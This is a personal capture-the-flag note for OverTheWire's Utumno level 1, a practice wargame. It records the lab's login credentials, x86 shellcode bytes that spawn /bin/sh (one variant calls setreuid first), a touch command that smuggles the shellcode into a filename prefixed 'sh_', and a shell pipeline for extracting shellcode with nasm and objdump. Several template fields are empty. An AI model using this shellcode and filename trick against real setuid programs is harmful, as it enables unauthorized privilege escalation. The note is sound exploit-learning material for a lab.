---
tags:
  - ctf
created: 2026-06-24
---

# `Level [1]` 
> 

## 🔐 Connection data

| Parameter | Value                       |
| --------- | --------------------------- |
| Host      | utumno.labs.overthewire.org |
| Port      | 2227                        |
| Login     | utumno1                     |
| Password  | g0Vpiw3aZt                  |

## 🎯 Task of the level
- craft shellcode with sh_ file name to make it valid and get shell
## 🎯 Information

| Type of information | Data                           |
| ------------------- | ------------------------------ |
| vuln func           | #strc                          |
| strcmp compare      | #strcmp comrape with `s        |
| buffer sizes        | 11 for after sh_ and 3 for sh_ |

`\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
## 🎯 Tools

| Tool | Destination | Usage |
| ---- | ----------- | ----- |
|      |             |       |
## 📚 Key commands/technics

| Coomand | Desctiption |
| ------- | ----------- |
|         |             |
|         |             |
|         |             |

## 💡 Step by step

| Step | Action | Information                                                                                                                                          |
| ---- | ------ | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    |        | \x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80 |
| 2    |        |                                                                                                                                                      |
| 3    |        |                                                                                                                                                      |

## 🔍 Result
Flag:

## 🚪 Travel
-> [Utumno_1]

## 🔗 Link
- [Название ресурса](URL)
`touch $(python3 -c 'import sys; sys.stdout.buffer.write(b"sh_"+b"A"*11+b"\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')

```nasm -f elf32 shell.asm
ld -m elf_i386 -s -o shell shell.o
objdump -d ./shell.o | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'```